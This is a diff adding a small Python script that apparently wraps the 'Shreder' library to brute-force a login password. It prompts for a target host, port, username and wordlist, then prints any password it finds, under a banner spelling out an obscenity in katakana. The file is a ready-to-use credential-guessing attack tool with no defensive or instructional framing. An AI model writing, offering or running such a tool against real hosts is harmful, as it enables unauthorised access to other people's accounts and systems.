@@ -1,0 +1,37 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+import os
+from shreder import Shreder
+
+B  = '\033[1;34'
+C  = '\033[1;36m'
+G  = '\033[1;34m'
+OG = '\033[92m'
+LG = '\033[1;32m'
+W  = '\033[1;37m'
+R  = '\033[1;31m'
+Y  = '\033[1;33m'
+
+def banner():
+    os.system('clear')
+    print('')
+    print(R+'    フ'+Y+'ァ'+G+'ッ'+C+'ク'+OG+'ユ'+LG+'ー'+W)
+    print('')
+
+banner()
+print('')
+host = str(input(W+' host : '))
+port = str(input(W+' port : '))
+username = str(input(W+' username : '))
+wordlist = str(input(W+' wordlist : '))
+
+banner()
+print(Y+' //'+W+' Trying to bruteforce password for '+C+username+'@'+host+W)
+print('')
+shreder = Shreder()
+password = shreder.brute(host, port, username, wordlist)
+if password == None:
+    print(R+' [x]'+W+' Password not found')
+else:
+    print(C+' [+]'+W+' Password : '+C+password)
